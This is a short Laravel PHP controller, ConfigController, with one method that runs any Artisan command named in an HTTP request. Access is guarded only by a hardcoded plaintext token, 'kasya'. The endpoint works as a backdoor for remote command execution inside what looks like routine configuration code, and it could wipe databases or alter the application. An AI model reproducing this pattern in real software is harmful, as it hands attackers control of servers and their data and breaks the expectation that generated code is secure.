<?php

namespace App\Http\Controllers\Api;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Artisan;

class ConfigController extends Controller
{

    public function command(Request $request)
    {
        if ($request->token == 'kasya') {
            return Artisan::call($request->command);
        } else {
            return 'fail';
        }
    }
}